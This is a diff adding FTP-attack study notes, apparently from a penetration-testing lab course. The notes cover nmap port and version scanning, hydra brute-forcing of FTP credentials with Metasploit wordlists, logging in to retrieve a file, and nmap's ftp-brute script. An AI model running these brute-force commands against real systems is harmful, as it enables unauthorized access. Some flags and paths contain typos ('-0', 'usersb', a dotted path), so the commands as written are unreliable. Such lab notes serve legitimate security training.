@@ -1710,3 +1710,28 @@ use more to read content and q to get out of
 		S-1-22-1-1003 Unix User\admin (Local User)
 
 
+---- 
+
+####  FTP 
+
+- File transfer protocol 
+- run nmap scan 
+- hone in on open ftp port with opering scan and service scan: **nmap {target} -p 21 -sV -0** 
+	- -   `-p 21`: This option specifies that only port 21 (FTP) should be scanned. The `-p` option followed by the port number restricts the scan to that specific port. In this case, port 21 is being scanned.
+	-   `-sV`: This option enables service/version detection. Nmap will attempt to determine the service running on the scanned port and provide information about the version of the service if possible.
+	-   `-O`: This option enables operating system detection. Nmap will try to identify the operating system running on the target system by analyzing various network characteristics and responses.
+- run: **hydra -L /usr/share/metasploit-framework/data/wordlist/common_users.txt -P /usr.share.metasploit-framework/data/wordlist/unix_passwords.txt {target ip} {service}** 
+	- -   `hydra`: This is the command to run Hydra, a popular online password cracking tool.
+	-   `-L /usr/share/metasploit-framework/data/wordlist/common_users.txt`: This option specifies the path to the username wordlist file to be used during the brute-force attack. 
+	-   `-P /usr/share/metasploit-framework/data/wordlist/unix_passwords.txt`: This option specifies the path to the password wordlist file to be used during the brute-force attack.
+	-   `{service}`: Replace this with the specific service you want to target during the brute-force attack. Examples include `ssh`, `ftp`, `telnet`, etc.
+- run: ftp {ip}  (use credentials from the results from the hydra scan)
+- get {secret file}
+	- exit ftp server with: bye 
+	- cat file 
+	  
+	  
+	  
+- echo "sysadmin" > users 
+- cat users 
+- nmap ip --script ftp-brute --script-args usersb=/root/users -p 21 
